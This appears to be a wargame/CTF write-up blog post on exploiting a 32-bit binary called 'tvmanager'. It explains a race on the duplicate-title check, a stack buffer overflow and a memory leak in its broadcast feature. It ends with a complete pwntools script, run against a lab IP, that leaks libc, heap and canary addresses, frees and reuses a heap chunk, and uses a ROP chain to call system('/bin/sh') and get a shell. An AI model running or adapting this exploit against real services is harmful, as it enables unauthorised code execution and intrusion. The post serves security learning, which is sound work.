---
layout: post
title: "[] tvmanager"
comments: true
category: wargame
---

## checksec

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

Partial RELRO.

*** 

## binary

First, Let's see main func.<br />

<img src="/assets/img/tvmanager/main.png" width="500">

Input name, and mkdir with name's MD5hash. <br />
And then, do intro process. <br />
Print program's menu, and receive input menuNum. <br />
Repeat through while statement. <br />
<br />
Let's see intro.<br />

<img src="/assets/img/tvmanager/intro.png" width="500">

There is 'movies.txt' file in directory. If there isn't, then make it. <br />
All movies' information is written in this file. <br />
Move information to memory. <br />
In 'movies.txt', information is written in order of [titleLen - title - category - size]. <br />
But in memory, movie's struct is in the order [size(int) | category(int) | titlePtr(char*) | fd | bk]. <br />
<br />
Now, let's see register. <br />

<img src = "/assets/img/tvmanager/register1.png" width="500">
<img src = "/assets/img/tvmanager/register2.png" width="700">

For register new movie, it finds last movie in the list.<br />
After that, receive new movie's information and write it to memory. <br />
If this movie is first, then set movieListStartPoint(global). <br />
Also, write it to 'movies.txt'.<br />
<br />
We can find vulnerability at this func(0x18b0). <br />
It checks for title duplication only in memory. <br />
This means, if we use hash collision, we can write twice about one title. <br />
<br />
Let's explore other function and find point for using that vulnerability. <br />
This is broadcast. <br />

<img src = "/assets/img/tvmanager/broadcast.png" width="500">
<img src = "/assets/img/tvmanager/broadMain.png" width="500">

At broadcast, set values and call broadMain. <br />
It receives parts of ip and port number, and broadcast contents to there. <br />
If content's size is lower then 0x400, contents are stored in stack, but in the oppisite case, they are stored in heap. <br />
Assume X size contents and Y size contents. <br />
In a situation X < 0x400 and Y >=0x400, if we read contents by X, then it cause bof. <br />
Other situation X < 0x400 and Y < X, if we read contents by X, then we can read stack. <br />
Through this, we can make bof, and get libc, stack, and heap's address. <br />

***

## Ex flow

1. Leak libc_base, stack's address, heap's address and chunk's address.
2. Doing bof and overwrite 'n' of 'if(n > 0x3ff)' and 'ptr' of 'free(ptr)'.
3. We can free chunk which we want. Free the first movie's chunk.
4. Chunk size is different by title's length. If we register a decent sized movie, then we can use chunk which we free before.
5. When we reuse chunk, we can set values, so we can get canary.
6. Lastly, through ROP, we can get shell.

***

## Ex code
```python
from pwn import *

context.log_level = 'debug'

r1 = remote('192.168.0.2', 8106)
r2 = remote('192.168.0.2', 8106)

print("r1 start")
r1.sendlineafter(b'name > ', b'AA')
r1.sendlineafter(b'> ', b'2')
r1.sendlineafter(b'title of movie > ', b'BB')
r1.sendlineafter(b'category of movie > ', b'1')

#pass checking title (duplicate)
print("r2 start")
r2.sendlineafter(b'name > ', b'AA')
r2.sendlineafter(b'> ', b'2')
r2.sendlineafter(b'title of movie > ', b'BB')
r2.sendlineafter(b'category of movie > ', b'1')

r1.sendlineafter(b'size of movie > ', str(0x88).encode())
r1.send(b'C'*0x88)

sleep(1)

r2.sendlineafter(b'size of movie > ', str(0x0).encode())

r1.close()
r2.close()


#listen on 1111
server = listen(1111)


# size1 < size2 and size2>=0x400
r1 = remote('192.168.0.2', 8106)
r2 = remote('192.168.0.2', 8106)
r3 = remote('192.168.0.2', 8106)
r4 = remote('192.168.0.2', 8106)

r1.sendlineafter(b'name > ', b'AA')
r1.sendlineafter(b'> ', b'2')
r1.sendlineafter(b'title of movie > ', b'BBB')
r1.sendlineafter(b'category of movie > ', b'2')


r2.sendlineafter(b'name > ', b'AA')
r2.sendlineafter(b'> ', b'2')
r2.sendlineafter(b'title of movie > ', b'BBB')
r2.sendlineafter(b'category of movie > ', b'2')

r1.sendlineafter(b'size of movie > ', str(0x0).encode())

r3.sendlineafter(b'name > ', b'AA')
r3.sendlineafter(b'> ', b'2')
r3.sendlineafter(b'title of movie > ', b'BBBB')
r3.sendlineafter(b'category of movie > ', b'2')

r4.sendlineafter(b'name > ', b'AA')
r4.sendlineafter(b'> ', b'2')
r4.sendlineafter(b'title of movie > ', b'BBBB')
r4.sendlineafter(b'category of movie > ', b'2')

r3.sendlineafter(b'size of movie > ', str(0x0).encode())
#Broadcast and leak addrs
r = remote('192.168.0.2', 8106)
pause()
r.sendlineafter(b'name > ', b'AA')
r.sendlineafter(b'> ', b'3')
r.sendlineafter(b'index of movie > ', b'1')
r.sendlineafter(b'channel > ', b'0-1-1111')

data = server.recvn(0x88)


libc_base = u32(data[0x0c:0x10]) - 0x1b3000
canary_addr = u32(data[0x4c:0x50]) + 0x36c + 0x80
chunk_addr = u32(data[0x84:0x88]) + 0x08

print("***")
print(hex(libc_base))
print(hex(canary_addr))
print(hex(chunk_addr))

sleep(1)

r2.sendlineafter(b'size of movie > ', str(0x408).encode())
r2.send(b'C'*0x3FF + p32(0x400) + p32(chunk_addr))

r1.close()
r2.close()

pause()
r.sendlineafter(b'> ', b'3')
r.sendlineafter(b'index of movie > ', b'3')
r.sendlineafter(b'channel > ', b'0-1-1111')


# send title correctly to overwrite first movie struct
r.sendlineafter(b'> ', b'2')
r.sendlineafter(b'title of movie > ', b'AAAA' + p32(0xffffffec) + p32(canary_addr+1) + p32(chunk_addr+0x28))
r.sendlineafter(b'category of movie > ', b'3')
r.sendlineafter(b'size of movie > ', str(0x0).encode())

#get canary
r.sendlineafter(b'> ', b'1')
r.recvuntil(b'Titile : ')
canary = u32(b'\x00' + r.recvn(3))
print("canary")
print(hex(canary))

# get sh
sh = libc_base + 0x15bb2b
system = libc_base + 0x3adb0
pay = b'B' * 0x3FF
pay += p32(0x400)
pay += p32(chunk_addr)
pay += p32(canary)
pay += b'A' * 0xc
pay += p32(system)
pay += b'A' * 0x4
pay+=p32(sh)


r4.sendlineafter(b'size of movie > ', str(len(pay)+1).encode())
r4.sendline(pay)

r3.close()
r4.close()

pause()

r.sendlineafter(b'> ', b'3')
r.sendlineafter(b'index of movie > ', b'4')
r.sendlineafter(b'channel > ', b'0-1-1111')

r.interactive()
```